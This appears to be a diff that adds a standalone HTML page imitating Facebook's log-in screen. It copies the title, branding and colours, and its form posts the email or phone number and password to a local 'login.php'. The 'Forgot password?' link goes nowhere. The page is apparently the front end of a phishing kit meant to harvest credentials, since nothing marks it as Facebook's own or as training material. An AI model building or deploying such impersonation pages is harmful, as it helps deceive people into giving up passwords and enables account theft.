@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Facebook – log in or sign up</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+    }
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: white;
+      padding: 20px;                                             width: 350px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+      border-radius: 8px;
+      text-align: center;
+    }
+    .login-box h2 {
+      color: #1877f2;
+      font-size: 32px;
+      margin-bottom: 20px;
+    }
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    .login-box button:hover {
+      background-color: #166fe5;
+    }
+    .login-box .link {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #1877f2;
+      text-decoration: none;
+      display: inline-block;
+    }
+    .login-box .link:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <h2>facebook</h2>
+      <form action="login.php" method="POST">
+        <input type="text" name="username" placeholder="Email or phone number" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+      </form>
+      <a href="#" class="link">Forgot password?</a>
+    </div>
+  </div>
+</body>
+</html>
